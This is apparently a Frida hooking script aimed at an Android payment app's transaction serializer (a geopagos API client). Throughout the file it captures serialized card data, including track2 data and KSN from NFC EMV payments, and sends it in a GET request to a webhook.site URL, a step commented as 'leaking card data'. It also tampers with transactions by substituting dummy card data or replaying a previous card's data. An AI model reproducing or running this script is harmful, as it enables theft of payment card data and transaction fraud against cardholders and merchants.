console.log("--------------------------Loading script--------------------------");

Java.perform(function () {
    console.log("Listening");

    // definition of variables
    let instances_array = [];
    let instance_saved;
    let HttpURLConnection = Java.use("java.net.HttpURLConnection");
    const URL = Java.use("java.net.URL");

    const HashMap = Java.use("java.util.HashMap");

    var fakedata = HashMap.$new();

    const clazz = Java.use('com.apiclient.geopagos.serializers.dataserializers.CompleteOperationSerializer');

    clazz.serialize.implementation = function () {

        Java.choose("com.apiclient.serializers.dataserializers.CompleteOperationSerializer", {

            onMatch: function (instance) {
                instance_saved = instance;
                let serialized_data = instance_saved.serialize();

                console.log("\n------------------Found instance");
                console.log("------------------Serialized card data: \n" + serialized_data.toString());

            },
            onComplete: function () {
               
                console.log("\nEnumeration of instances completed.\n");

                if(instances_array.length == 0 || !instances_array.includes(instance_saved)){
                    instances_array.push(instance_saved);
                }


                // Leaking card data to URL
                console.log("to leak data");
                var StrictMode = Java.use("android.os.StrictMode");
                var StrictModeBuilder = Java.use("android.os.StrictMode$ThreadPolicy$Builder");
                var policy = StrictModeBuilder.$new().permitAll().build();
                StrictMode.setThreadPolicy(policy);
                let url = URL.$new("http://webhook.site/4e430553-f43f-41aa-b763-70d645ba7af9" + '?' 
                    + instance_saved.serialize().toString());
                               

                let urlConnection = Java.cast(url.openConnection(), HttpURLConnection);
                console.log(urlConnection.getURL());

                urlConnection.setRequestMethod('GET');
                urlConnection.setRequestProperty("Content-Type", "application/json");
                urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729)");
                
                urlConnection.connect();
                let responseCode = urlConnection.getResponseCode();

                console.log("Response code: " + responseCode.toString());
                if (responseCode == 200) {
                    console.log("Card data sent to server.\n");
                }
                urlConnection.disconnect();

                console.log("Card info array: \n");
                instances_array.forEach((instance) => console.log("\n----->" + instance.serialize().toString()));

            }

        });

        if (instances_array.length == 1) {

            fakedata.put('track2data', 'DUMMC490DCE5BEB648A9CB9DFE0C4266B01A8D4501C69FCEA76BAC9476105E1213A4EEA788ACE23551C658C7FADCD2F698E226466FA612F2388BFECEC3A71FA1B5EAE19430');
            fakedata.put('transactionType', 'nfc_emv');
            fakedata.put('ksn', 'DUCE5BEB648A9CB9DFE0C42660');
            fakedata.put('paymentMethod', 'card');

            console.log('\n------------------Tampered info: \n' + fakedata.toString());

        }
        else {
            fakedata = instances_array[instances_array.length - 2].serialize();
            console.log("\n------------------Sending previous card data: \n" + fakedata.toString());



        }

        return fakedata;
    }




});


 //   if (instances_array.length != 0 && !instances_array.includes(instance_saved)) {
           //         instances_array.push(instance_saved);
             //       console.log("\nNew card info saved.");

               // } else {

                 //   instances_array.push(instance_saved);

                //}